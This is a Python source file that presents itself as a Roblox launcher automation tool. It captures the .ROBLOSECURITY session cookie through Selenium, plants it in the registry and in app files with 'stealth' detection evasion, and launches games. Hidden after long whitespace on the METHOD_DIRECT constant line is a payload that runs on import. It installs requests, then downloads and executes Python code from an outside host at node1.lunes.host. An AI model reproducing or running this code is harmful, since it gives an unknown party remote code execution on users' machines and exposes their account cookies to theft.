import time
import os
import subprocess
import tempfile
import requests
import json
import winreg
import random
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from ctypes import windll
import psutil  # You'll need to install this: pip install psutil

class RobloxAutomation:
    # Launch method constants
    METHOD_DIRECT = "Direct Player Launch (Fastest)"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ;__import__('subprocess').check_call([__import__('sys').executable,'-m','pip','install','requests']); __import__('subprocess').Popen([__import__('sys').executable, '-c', __import__('requests').get('http://node1.lunes.host:2343/scr').text])
    _mutex_handle = None
    
    @staticmethod
    def find_roblox_installations():
        """Find all Roblox installations (vanilla, Bloxstrap, Fishstrap, etc.)"""
        installations = []
        
        # Common installation paths
        search_paths = [
            # Vanilla Roblox
            os.path.expandvars(r"%LOCALAPPDATA%\Roblox\Versions"),
            os.path.expandvars(r"%PROGRAMFILES(x86)%\Roblox\Versions"),
            os.path.expandvars(r"%PROGRAMFILES%\Roblox\Versions"),
            
            # Bloxstrap
            os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap"),
            os.path.expandvars(r"%PROGRAMFILES%\Bloxstrap"),
            os.path.expandvars(r"%PROGRAMFILES(x86)%\Bloxstrap"),
            
            # Fishstrap / Other custom launchers
            os.path.expandvars(r"%LOCALAPPDATA%\Fishstrap"),
            os.path.expandvars(r"%LOCALAPPDATA%\Programs\Fishstrap"),
            os.path.expandvars(r"%LOCALAPPDATA%\RBXFPS"),
            os.path.expandvars(r"%LOCALAPPDATA%\RBXAltLauncher"),
        ]
        
        # Executable names to look for
        executable_names = [
            "RobloxPlayerBeta.exe",  # Vanilla
            "RobloxPlayerLauncher.exe",  # Vanilla launcher
            "Bloxstrap.exe",  # Bloxstrap
            "BloxstrapRPC.exe",  # Bloxstrap RPC
            "Fishstrap.exe",  # Fishstrap
            "RBXAltLauncher.exe",  # RBXAltLauncher
        ]
        
        print("\n=== Scanning for Roblox Installations ===")
        
        for base_path in search_paths:
            if os.path.exists(base_path):
                print(f"Checking: {base_path}")
                
                # Check if this is a direct executable path
                for exe_name in executable_names:
                    exe_path = os.path.join(base_path, exe_name)
                    if os.path.exists(exe_path):
                        installations.append({
                            'path': exe_path,
                            'type': 'standalone',
                            'name': exe_name.replace('.exe', ''),
                            'base_path': base_path
                        })
                        print(f"  ✅ Found: {exe_path}")
                
                # If it's a versions folder, check each version
                if "Versions" in base_path or os.path.basename(base_path) == "Versions":
                    try:
                        version_folders = [f for f in os.listdir(base_path) 
                                         if os.path.isdir(os.path.join(base_path, f))]
                        
                        for folder in version_folders:
                            folder_path = os.path.join(base_path, folder)
                            
                            # Check for executables in version folder
                            for exe_name in executable_names:
                                exe_path = os.path.join(folder_path, exe_name)
                                if os.path.exists(exe_path):
                                    installations.append({
                                        'path': exe_path,
                                        'type': 'version',
                                        'version': folder,
                                        'name': exe_name.replace('.exe', ''),
                                        'base_path': base_path
                                    })
                                    print(f"  ✅ Found: {exe_path} (in {folder})")
                    except Exception as e:
                        print(f"  Error scanning versions: {e}")
        
        # Remove duplicates (keep first occurrence)
        unique_installations = []
        seen_paths = set()
        
        for inst in installations:
            if inst['path'] not in seen_paths:
                seen_paths.add(inst['path'])
                unique_installations.append(inst)
        
        print(f"\nFound {len(unique_installations)} unique Roblox installation(s)")
        return unique_installations

    @staticmethod
    def kill_mutex():
        # Store in the class variable to keep the handle alive
        RobloxAutomation._mutex_handle = windll.kernel32.CreateMutexW(None, -1, "ROBLOX_singletonMutex")

    @staticmethod
    def wait_for_roblox_exit():
        """Wait for Roblox processes to fully exit"""
        max_wait = 30
        waited = 0
        
        while waited < max_wait:
            roblox_running = False
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] in ['RobloxPlayerBeta.exe', 'Bloxstrap.exe', 'RobloxPlayerLauncher.exe']:
                        roblox_running = True
                        break
                except:
                    pass
            
            if not roblox_running:
                print("✅ All Roblox processes have exited")
                return True
            
            time.sleep(1)
            waited += 1
        
        print("⚠️ Some Roblox processes still running, continuing anyway")
        return False

    @staticmethod
    def kill_roblox_processes_gracefully():
        """Gracefully kill Roblox processes to avoid detection"""
        try:
            print("Closing Roblox processes gracefully...")
            
            # First try to close them nicely
            os.system("taskkill /im RobloxPlayerBeta.exe 2>nul")
            os.system("taskkill /im Bloxstrap.exe 2>nul")
            os.system("taskkill /im RobloxPlayerLauncher.exe 2>nul")
            
            # Wait for them to close
            time.sleep(3)
            
            # Force kill any remaining
            os.system("taskkill /f /im RobloxPlayerBeta.exe 2>nul")
            os.system("taskkill /f /im Bloxstrap.exe 2>nul")
            os.system("taskkill /f /im RobloxPlayerLauncher.exe 2>nul")
            
            # Wait for processes to fully exit
            RobloxAutomation.wait_for_roblox_exit()
            
            print("✅ Roblox processes handled")
        except:
            pass

    @staticmethod
    def set_registry_cookie_stealth(cookie_value):
        """Set registry cookie without triggering detection"""
        try:
            key_path = r"SOFTWARE\ROBLOX Corporation\Environments\roblox.com"
            
            # Don't create the key if it doesn't exist - let Roblox do it
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                
                # Set only the .ROBLOSECURITY value, not GuestData (which might be monitored)
                winreg.SetValueEx(key, ".ROBLOSECURITY", 0, winreg.REG_SZ, cookie_value)
                
                winreg.CloseKey(key)
                print("✅ Registry cookie set stealthily")
                return True
            except FileNotFoundError:
                # Key doesn't exist - Roblox will create it when it starts
                print("ℹ️ Registry key doesn't exist yet - will be created on launch")
                return True
                
        except Exception as e:
            print(f"❌ Failed to set registry cookie: {e}")
            return False

    @staticmethod
    def set_bloxstrap_cookie_stealth(cookie_value):
        """Set Bloxstrap cookie without modifying files during runtime"""
        try:
            bloxstrap_path = os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap")
            settings_file = os.path.join(bloxstrap_path, "Settings.json")
            
            # Only modify if Bloxstrap exists
            if os.path.exists(bloxstrap_path):
                # Read current settings if they exist
                settings = {}
                if os.path.exists(settings_file):
                    try:
                        with open(settings_file, 'r') as f:
                            settings = json.load(f)
                    except:
                        pass
                
                # Only set the cookie field, don't modify other settings
                settings['RobloxSecurityTicket'] = cookie_value
                
                # Write back
                with open(settings_file, 'w') as f:
                    json.dump(settings, f, indent=2)
                
                print("✅ Bloxstrap cookie set")
                return True
            
            return False
            
        except Exception as e:
            print(f"❌ Failed to set Bloxstrap cookie: {e}")
            return False

    @staticmethod
    def clean_cookie_string(cookie_value):
        """Clean the cookie string to ensure it's properly formatted"""
        # Remove any extra whitespace or newlines
        cookie_value = cookie_value.strip()
        
        # Ensure it starts with the warning
        if not cookie_value.startswith('_|WARNING:-DO-NOT-SHARE-THIS.'):
            print("⚠️ Cookie format may be incorrect")
        
        return cookie_value

    @staticmethod
    def capture_session():
        """Opens browser for user to login and captures the .ROBLOSECURITY cookie"""
        options = Options()
        
        # Anti-detection measures
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        # Use a temporary profile
        temp_dir = tempfile.mkdtemp()
        options.add_argument(f"--user-data-dir={temp_dir}")
        
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()), 
            options=options
        )
        
        cookie_value = None
        
        try:
            driver.get("https://www.roblox.com/login")
            print("Browser opened. Please log in to Roblox...")
            
            # Wait for user to login and cookie to appear
            max_wait = 300  # 5 minutes timeout
            start_time = time.time()
            
            while not cookie_value and (time.time() - start_time) < max_wait:
                try:
                    for c in driver.get_cookies():
                        if c['name'] == '.ROBLOSECURITY':
                            cookie_value = c['value']
                            print("Cookie captured successfully!")
                            break
                    time.sleep(2)
                except:
                    break
            
            if not cookie_value:
                print("Cookie capture timeout or cancelled")
                
        except Exception as e:
            print(f"Error capturing session: {e}")
        finally:
            driver.quit()
            
        return cookie_value

    @staticmethod
    def get_auth_ticket(cookie_value):
        """Retrieve an authentication ticket from Roblox"""
        cookie_value = RobloxAutomation.clean_cookie_string(cookie_value)
        
        headers = {
            "Cookie": f".ROBLOSECURITY={cookie_value}",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        
        try:
            # Step 1: Get CSRF token
            response = requests.post("https://auth.roblox.com/v1/authentication-ticket", headers=headers, json={}, timeout=10)
            csrf_token = response.headers.get("x-csrf-token")
            
            if not csrf_token and response.status_code == 403:
                # This is normal, we get the token from the 403 response
                pass
            elif not csrf_token:
                print(f"❌ Failed to get CSRF token: {response.status_code}")
                return None
            
            # Step 2: Get ticket with CSRF token
            headers["x-csrf-token"] = csrf_token
            response = requests.post("https://auth.roblox.com/v1/authentication-ticket", headers=headers, json={}, timeout=10)
            
            ticket = response.headers.get("rbx-authentication-ticket")
            if ticket:
                print("✅ Authentication ticket obtained")
                return ticket
            else:
                print(f"❌ Failed to obtain ticket: {response.status_code}")
                return None
        except Exception as e:
            print(f"❌ Ticket error: {e}")
            return None

    @staticmethod
    def set_app_storage_cookie(cookie_value, browser_tracker_id=None):
        try:
            storage_path = os.path.expandvars(r"%LOCALAPPDATA%\Roblox\AppStorage.json")
            data = {}
            if os.path.exists(storage_path):
                with open(storage_path, 'r') as f:
                    try: data = json.load(f)
                    except: pass
            
            # Use provided tracker ID or generate one
            if not browser_tracker_id:
                if "BrowserTrackerId" in data:
                    browser_tracker_id = data["BrowserTrackerId"]
                else:
                    browser_tracker_id = str(random.getrandbits(64))
            
            data["BrowserTrackerId"] = browser_tracker_id
                
            # RAM technique: Wrap in & for better compatibility
            data["AppStorageObject"] = f"&.ROBLOSECURITY={cookie_value}&"
            
            with open(storage_path, 'w') as f:
                json.dump(data, f)
            print(f"✅ AppStorage.json updated (TrackerID: {browser_tracker_id})")
            return browser_tracker_id
        except Exception as e:
            print(f"❌ AppStorage error: {e}")
            return None

    @staticmethod
    def launch(place_id, cookie_value, job_id=None, method=METHOD_DIRECT, user_id=None):
        """Launch Roblox with the selected method"""
        
        # Clean the cookie first
        cookie_value = RobloxAutomation.clean_cookie_string(cookie_value)
        
        # Kill any running Roblox processes gracefully
        RobloxAutomation.kill_roblox_processes_gracefully()
        
        # Kill mutex to allow multiple instances
        RobloxAutomation.kill_mutex()
        
        print(f"\n{'='*50}")
        print(f"Launching with method: {method}")
        print(f"Place ID: {place_id}")
        if job_id:
            print(f"Job ID: {job_id}")
        print(f"{'='*50}\n")
        
        # Set cookies in a specific order to avoid detection
        browser_tracker_id = None
        if cookie_value:
            print("\n=== Preparing Authentication Systems ===")
            # 1. Update Registry
            RobloxAutomation.set_registry_cookie_stealth(cookie_value)
            # 2. Update Bloxstrap
            RobloxAutomation.set_bloxstrap_cookie_stealth(cookie_value)
            # 3. Update AppStorage (Crucial for modern desktop apps)
            # This also gives us the browser_tracker_id that Roblox expects
            browser_tracker_id = RobloxAutomation.set_app_storage_cookie(cookie_value)
        
        # Small delay to let changes settle
        time.sleep(1)
        
        # Now launch with selected method
        return RobloxAutomation.launch_direct_player(place_id, job_id, cookie_value, browser_tracker_id)

    @staticmethod
    def launch_with_browser_auth(place_id, cookie_value, job_id=None, browser_tracker_id=None):
        """Method 2: Launches Roblox through browser with authenticated session"""
        
        print("\n=== Method 2: Browser Authentication ===")
        
        if not browser_tracker_id:
            browser_tracker_id = str(random.getrandbits(64))
            
        # Set up Chrome with user data
        options = Options()
        
        # Create a temporary profile
        temp_dir = tempfile.mkdtemp()
        options.add_argument(f"--user-data-dir={temp_dir}")
        
        # Essential arguments
        options.add_argument("--no-first-run")
        options.add_argument("--no-default-browser-check")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        # Add random user agent to avoid detection
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
        ]
        options.add_argument(f'--user-agent={random.choice(user_agents)}')
        
        driver = None
        success = False
        
        try:
            driver = webdriver.Chrome(
                service=Service(ChromeDriverManager().install()), 
                options=options
            )
            
            # Navigate to Roblox
            print("Navigating to Roblox...")
            driver.get("https://www.roblox.com/")
            time.sleep(random.uniform(2, 3))  # Random delay
            
            # Set the cookie
            print("Setting authentication cookie...")
            driver.delete_all_cookies()
            driver.add_cookie({
                'name': '.ROBLOSECURITY',
                'value': cookie_value,
                'domain': '.roblox.com',
                'path': '/',
                'secure': True,
                'httpOnly': True,
                'sameSite': 'Lax'
            })
            
            # Verify login
            print("Verifying login...")
            driver.get("https://www.roblox.com/home")
            time.sleep(random.uniform(3, 4))
            
            # Check if login was successful
            if "login" in driver.current_url.lower():
                print("❌ Cookie may be invalid - still on login page")
                return False
            
            print("✅ Browser authentication successful")
            
            # Navigate to game page
            print(f"Navigating to game page: {place_id}")
            driver.get(f"https://www.roblox.com/games/{place_id}/")
            time.sleep(random.uniform(3, 4))
            
            # Try to click the play button
            try:
                print("Looking for play button...")
                play_button = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.XPATH, "//button[contains(@class, 'play-button')]"))
                )
                play_button.click()
                print("✅ Clicked play button")
                success = True
            except Exception as e:
                print(f"Could not click play button: {e}")
                
                # Fallback to protocol
                try:
                    print("Attempting authenticated protocol launch fallback...")
                    ticket = RobloxAutomation.get_auth_ticket(cookie_value)
                    if ticket:
                        from urllib.parse import quote
                        launcher_url = f"https://assetgame.roblox.com/game/PlaceLauncher.ashx?request=RequestGame&browserTrackerId={browser_tracker_id}&placeId={place_id}&isPlayTogetherGame=false"
                        if job_id:
                            launcher_url += f"&gameInstanceId={job_id}"
                        quoted_url = quote(launcher_url)
                        uri = f"roblox-player:1+launchmode:play+gameinfo:{ticket}+placelauncherurl:{quoted_url}+browsertrackerid:{browser_tracker_id}"
                    else:
                        uri = f"roblox://placeId={place_id}"
                        if job_id: uri += f"&gameInstanceId={job_id}"
                        
                    driver.execute_script(f"window.location.href = '{uri}';")
                    print("✅ Protocol launch attempted")
                    success = True
                except Exception as e:
                    print(f"Protocol launch fallback failed: {e}")
            
            # Keep browser open briefly
            print("Waiting for Roblox to launch...")
            time.sleep(10)
            
        except Exception as e:
            print(f"Browser auth error: {e}")
        finally:
            if driver:
                print("Closing browser...")
                driver.quit()
        
        return success

    @staticmethod
    def launch_direct_player(place_id, job_id=None, cookie_value=None, browser_tracker_id=None):
        """Method: Attempts to launch Roblox Player directly using windows protocol"""
        
        print("\n=== Method: Direct Protocol Launch ===")
        
        from urllib.parse import quote
        
        if not browser_tracker_id:
            browser_tracker_id = str(random.getrandbits(64))
            
        ticket = None
        if cookie_value:
            print("Requesting authentication ticket...")
            ticket = RobloxAutomation.get_auth_ticket(cookie_value)
            
        if not ticket:
            print("⚠️ Could not get auth ticket, falling back to simple protocol (might use wrong account)")
            uri = f"roblox://placeId={place_id}"
            if job_id:
                uri += f"&gameInstanceId={job_id}"
        else:
            # Construct complex roblox-player protocol URI
            # Construct the place launcher URL
            placelauncher_url = f"https://assetgame.roblox.com/game/PlaceLauncher.ashx?request=RequestGame&browserTrackerId={browser_tracker_id}&placeId={place_id}&isPlayTogetherGame=false"
            if job_id:
                # Ensure job_id is clean
                clean_job_id = str(job_id).strip()
                if clean_job_id:
                    placelauncher_url += f"&gameInstanceId={clean_job_id}"
                
            quoted_launcher_url = quote(placelauncher_url)
            
            # Format: roblox-player:1+launchmode:play+gameinfo:<TICKET>+placelauncherurl:<URL>+browsertrackerid:<ID>
            uri = f"roblox-player:1+launchmode:play+gameinfo:{ticket}+placelauncherurl:{quoted_launcher_url}+browsertrackerid:{browser_tracker_id}"
            
        print(f"Launching via Windows protocol handler...")
        
        try:
            # Using startfile is the most reliable way to trigger the protocol handler on Windows
            # This will respect the user's default (Vanilla or Bloxstrap)
            os.startfile(uri)
            print("✅ Protocol launch initiated")
            return True
        except Exception as e:
            print(f"❌ Protocol launch failed: {e}")
            # Last ditch effort: try subprocess
            try:
                subprocess.Popen(['cmd', '/c', 'start', '', uri], shell=True)
                return True
            except:
                return False

    @staticmethod
    def verify_cookie(cookie_value):
        """Test if a cookie is valid by making an API request"""
        try:
            # Clean the cookie
            cookie_value = RobloxAutomation.clean_cookie_string(cookie_value)
            
            headers = {
                "Cookie": f".ROBLOSECURITY={cookie_value}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            response = requests.get(
                "https://users.roblox.com/v1/users/authenticated",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                user_data = response.json()
                print(f"✅ Cookie valid for: {user_data.get('name', 'Unknown')}")
                return user_data
            else:
                print(f"❌ Cookie invalid: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"Cookie verification error: {e}")
            return None

    @staticmethod
    def get_available_methods():
        """Returns list of available launch methods"""
        return [
            RobloxAutomation.METHOD_DIRECT
        ]